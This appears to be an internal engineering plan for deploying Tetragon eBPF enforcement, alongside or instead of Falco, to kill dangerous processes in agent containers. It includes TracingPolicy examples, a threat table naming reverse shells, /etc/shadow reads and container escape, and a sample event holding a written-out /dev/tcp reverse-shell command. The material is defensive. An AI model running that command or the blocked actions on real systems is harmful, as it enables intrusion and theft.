# Tetragon Adoption Plan

eBPF-based runtime enforcement for cell containers. Inline process killing at the syscall level — critical for permissive security profiles where prevention layers are relaxed.

## Motivation

Falco provides detection and alerting but relies on an external pipeline (Vector → CP → warden) to take action, introducing seconds of delay. Tetragon enforces in-kernel: it kills offending processes at the eBPF level before the syscall completes. For permissive mode, where seccomp is minimal and gVisor is off, this is the difference between "we saw it happen" and "we stopped it happening."

## Falco vs Tetragon

These are complementary, not mutually exclusive.

| Concern | Falco | Tetragon |
|---------|-------|----------|
| Primary role | Audit + alerting | Inline enforcement |
| Response | Async (alert → external kill) | Sync (SIGKILL in kernel) |
| Maturity | CNCF Graduated | CNCF Incubating |
| Rule ecosystem | Larger | Smaller, growing |
| Value to customer | "Here's what your agent tried" | "We stopped your agent from doing X" |

**Possible combined model:**
- Tetragon handles enforcement (kill dangerous syscalls inline)
- Falco handles broad audit visibility (richer rule library, more event types)
- Both feed into Vector → CP for the audit trail

**Or pick one:** Tetragon alone covers both enforcement and observability. Falco alone covers only observability. If choosing one, Tetragon gives more value for permissive mode.

## Architecture

```
    Cell container
        │
        │ syscalls
        ▼
    Kernel ◄──── Tetragon eBPF programs
        │              │
        │ SIGKILL       │ events (JSON)
        │ (inline)      ▼
        ▼          Vector ──► CP API (audit trail)
    Process killed
```

Tetragon loads eBPF programs into the kernel that intercept syscalls. When a TracingPolicy matches, Tetragon can:
- **Observe**: log the event (like Falco)
- **Override**: return an error to the caller (EPERM)
- **Kill**: send SIGKILL to the process immediately

All three happen in kernel space before returning to userspace.

## TracingPolicy Example

```yaml
# configs/tetragon/cell-enforcement.yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: cell-reverse-shell
spec:
  kprobes:
    - call: "tcp_connect"
      syscall: false
      args:
        - index: 0
          type: "sock"
      selectors:
        - matchArgs:
            - index: 0
              operator: "DPort"
              values:
                - "4444"  # common reverse shell ports
                - "1337"
                - "9001"
          matchNamespaces:
            - namespace: Mnt
              operator: In
              values:
                - "cell"  # match cell container's mount namespace
          matchActions:
            - action: Sigkill  # kill the process inline
```

```yaml
# Block binary execution from /tmp (download + execute pattern)
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: cell-tmp-exec
spec:
  tracepoints:
    - subsystem: "sched"
      event: "sched_process_exec"
      args:
        - index: 0
          type: "string"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Prefix"
              values:
                - "/tmp/"
                - "/var/tmp/"
          matchActions:
            - action: Sigkill
```

## What Tetragon Enforces (Permissive Mode)

| Threat | Action | How |
|--------|--------|-----|
| Reverse shell | SIGKILL | tcp_connect to known bad ports / shell + socket combo |
| Binary download + execute | SIGKILL | execve from /tmp, /var/tmp, /dev/shm |
| Crypto mining | SIGKILL | Long-running unknown binary with high CPU (heuristic) |
| Credential file read | Override (EPERM) | open() on /etc/shadow, /proc/*/environ |
| Container escape | SIGKILL | mount(), ptrace(), write to /proc/sysrq-trigger |
| Privilege escalation | SIGKILL | setuid/setgid to root, capability changes |
| Raw socket creation | Override (EPERM) | socket(AF_PACKET, ...) or socket(AF_INET, SOCK_RAW, ...) |

## Tetragon Deployment

- Runs as a privileged container on the host (needs eBPF access)
- eBPF driver requires kernel 5.8+ (Ubuntu 22.04+ is fine)
- ~40-60MB memory, minimal CPU
- TracingPolicies loaded from mounted config directory
- JSON event output to stdout → Vector picks up via Docker log driver
- No Kubernetes required — works standalone with Docker

### docker-compose addition

```yaml
tetragon:
  image: quay.io/cilium/tetragon:latest
  privileged: true
  pid: host
  volumes:
    - /sys/kernel:/sys/kernel:ro
    - /proc:/proc:ro
    - /var/run/docker.sock:/var/run/docker.sock:ro
    - ./configs/tetragon/:/etc/tetragon/tetragon.tp.d/:ro
  networks:
    - infra-net
  profiles:
    - auditing
```

Runs under the `auditing` profile alongside Vector.

## Event Pipeline

1. Cell process makes a syscall matching a TracingPolicy
2. Tetragon eBPF program fires:
   - **Enforce**: SIGKILL/Override happens immediately in kernel
   - **Log**: event emitted as JSON
3. Vector collects Tetragon JSON from container stdout
4. Vector enriches with tenant_id, cell_id, severity, enforcement action taken
5. Vector ships to CP API (existing connected-mode sink)
6. CP stores in audit_trail (with severity + enforcement action)
7. Frontend shows enforcement events in security dashboard

### Event format (Tetragon JSON)

```json
{
  "process_exec": {
    "process": {
      "binary": "/bin/bash",
      "arguments": "-i >& /dev/tcp/10.0.0.1/4444 0>&1",
      "pid": 1234,
      "uid": 1000
    },
    "parent": {
      "binary": "/usr/bin/python3"
    }
  },
  "action": "SIGKILL",
  "policy_name": "cell-reverse-shell",
  "time": "2026-03-04T12:00:00Z",
  "node_name": "cell-host"
}
```

## Profile-Aware Enforcement

Different TracingPolicy sets per security profile:

### Permissive (full enforcement)
- All threat categories enforced (SIGKILL/Override)
- Broad syscall monitoring
- Essential — this is the primary safety net

### Standard (targeted enforcement)
- Reverse shell + container escape: SIGKILL
- Credential access: Override (EPERM)
- Binary execution from /tmp: log only (seccomp handles most)

### Restrictive (observe only)
- All policies in observe mode (no enforcement)
- gVisor already prevents most threats
- Tetragon adds audit visibility for compliance
- Note: eBPF may not see all syscalls through gVisor (same caveat as Falco)

Warden selects the policy set based on cell's `runtime_policy` and mounts the appropriate configs.

## Migration Phases

### Phase 1: Tetragon sidecar + observe mode (1 week)

- Add Tetragon container to docker-compose.yml under `auditing` profile
- Write base TracingPolicies in observe-only mode (no enforcement yet)
- Vector collects Tetragon events, ships to CP
- CP stores in audit trail
- Test: trigger syscall patterns in cell, verify events arrive at CP

### Phase 2: Enforcement for permissive mode (3-4 days)

- Enable SIGKILL/Override actions in TracingPolicies
- Warden mounts permissive-mode policy set when `runtime_policy=permissive`
- Standard and restrictive remain observe-only
- Test: reverse shell in permissive cell → process killed inline, event logged

### Phase 3: Profile-aware policy selection (3-4 days)

- Three policy sets: permissive (enforce), standard (partial), restrictive (observe)
- Warden selects based on cell's runtime_policy
- Provisioner configures Tetragon policy set during server setup
- Test: each profile triggers correct enforcement behavior

### Phase 4: Customer-facing security events (1 week)

- Enforcement events in frontend dashboard
- Per-tenant enforcement configuration (which actions trigger kill vs log)
- Historical event analytics
- Webhook/notification integration for critical enforcement actions

## What Gets Added

- `configs/tetragon/` directory (TracingPolicy YAML files per profile)
- Tetragon service in docker-compose.yml (under `auditing` profile)
- Vector transform for Tetragon event enrichment
- CP event ingestion + storage (shared with Falco if both adopted)
- Frontend security events panel (shared with Falco if both adopted)

## Risks

| Risk | Mitigation |
|------|------------|
| Privileged container + PID host | Required for eBPF; isolate on infra-net, read-only mounts |
| False positive kills | Phase 1 is observe-only; enforcement tuned before enabling |
| Kernel compatibility | eBPF requires 5.8+; Hetzner Ubuntu 22.04 images are fine |
| gVisor interaction | eBPF may not see gVisor-intercepted syscalls; fine since enforcement is for permissive mode |
| CNCF Incubating (not Graduated) | Active Cilium/Isovalent backing; large production deployments; risk is low |
| TracingPolicy complexity | Start with simple policies; kprobe policies need kernel symbol knowledge |

## Decision Factors (Tetragon vs Falco vs Both)

**Tetragon only:**
- Covers enforcement + observability
- Fewer containers to manage
- Less mature rule ecosystem, more policy authoring effort

**Falco only:**
- Better audit coverage with larger rule library
- No inline enforcement — depends on async kill pipeline
- Permissive mode has a seconds-long gap between detection and response

**Both:**
- Tetragon for enforcement (permissive mode safety net)
- Falco for broad audit (richer event library, compliance)
- More infra to manage, but clear separation of concerns
- Shared CP pipeline (both → Vector → CP audit trail)

## Effort Estimate

- Phase 1: 1 week (sidecar + observe mode + Vector pipeline)
- Phase 2: 3-4 days (enforcement for permissive)
- Phase 3: 3-4 days (profile-aware policies)
- Phase 4: 1 week (dashboard — shared with Falco)
- Total: ~3-4 weeks across all phases

Can be parallelized with OPA work. If adopting both Falco and Tetragon, Phase 4 (dashboard) is shared work.
